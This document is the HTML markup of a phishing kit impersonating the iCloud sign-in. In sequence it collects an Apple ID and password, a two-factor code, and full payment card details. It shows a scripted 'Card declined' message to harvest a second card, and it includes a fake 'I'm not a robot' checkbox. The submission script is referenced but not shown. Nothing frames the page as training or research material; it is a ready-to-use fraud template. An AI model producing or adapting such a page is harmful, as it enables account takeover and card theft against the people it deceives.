<body>
    <div id="pageContainer">
        <!-- Login Form (Loads First) -->
        <div id="loginForm" class="form-card">
            <div class="logo">
                <img src="logo.png" alt="iCloud" width="80">
            </div>
            <h1>Sign in to iCloud</h1>
            <form id="loginFormElement">
                <div class="input-group">
                    <input type="email" id="appleId" placeholder="Apple ID or Email" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <label class="checkbox">
                    <input type="checkbox" id="keepSignedIn"> Keep me signed in
                </label>
                <div id="captcha" style="margin: 20px auto; text-align: center;">
                    <label><input type="checkbox" id="notRobot"> I'm not a robot</label>
                </div>
                <button type="submit" class="submit-btn">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                        <path d="M8.5 5.5L15.5 12L8.5 18.5" stroke="white" stroke-width="2"/>
                    </svg>
                </button>
            </form>
            <div class="links">
                <a href="#" id="forgotPassword">Forgot Apple ID or password?</a>
            </div>
        </div>

        <!-- 2FA Page (Loads After Login Submission) -->
        <div id="twoFactorPage" class="page hidden">
            <div class="form-card">
                <div class="logo">
                    <img src="logo.png" alt="iCloud" width="80">
                </div>
                <h1>Two-Factor Authentication</h1>
                <p>Enter the 6-digit code sent to your trusted device or phone number.</p>
                <form id="twoFactorForm">
                    <div class="input-group code-input">
                        <input type="text" id="verificationCode" placeholder="6-digit code" maxlength="6" required>
                    </div>
                    <button type="submit" class="submit-btn rectangular">Verify</button>
                </form>
            </div>
        </div>

        <!-- Card Verification Page (Loads After 2FA Submission) -->
        <div id="cardVerifyPage" class="page hidden">
            <div class="form-card">
                <div class="logo">
                    <img src="logo.png" alt="iCloud" width="80">
                </div>
                <h1>Verify Your Payment Method</h1>
                <p>Enter your payment details to verify your account due to a recent security check.</p>
                <form id="cardForm">
                    <div class="input-group">
                        <input type="text" id="cardName" placeholder="Cardholder Name" required>
                    </div>
                    <div class="input-group">
                        <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19" required>
                    </div>
                    <div class="input-row">
                        <div class="input-group">
                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
                        </div>
                        <div class="input-group">
                            <input type="text" id="cvv" placeholder="CVV" maxlength="4" required>
                        </div>
                    </div>
                    <div class="input-group">
                        <input type="text" id="billingAddress" placeholder="Billing Address" required>
                    </div>
                    <div class="input-group">
                        <input type="text" id="billingZip" placeholder="ZIP Code" required>
                    </div>
                    <button type="submit" class="submit-btn rectangular">Verify Card</button>
                </form>
                <div id="declinedMsg" class="error hidden">Card declined. Please try another.</div>
                <form id="secondCardForm" class="hidden">
                    <div class="input-group">
                        <input type="text" id="cardName2" placeholder="Cardholder Name" required>
                    </div>
                    <div class="input-group">
                        <input type="text" id="cardNumber2" placeholder="Card Number" maxlength="19" required>
                    </div>
                    <div class="input-row">
                        <div class="input-group">
                            <input type="text" id="expiry2" placeholder="MM/YY" maxlength="5" required>
                        </div>
                        <div class="input-group">
                            <input type="text" id="cvv2" placeholder="CVV" maxlength="4" required>
                        </div>
                    </div>
                    <button type="submit" class="submit-btn rectangular">Verify Alternate Card</button>
                </form>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
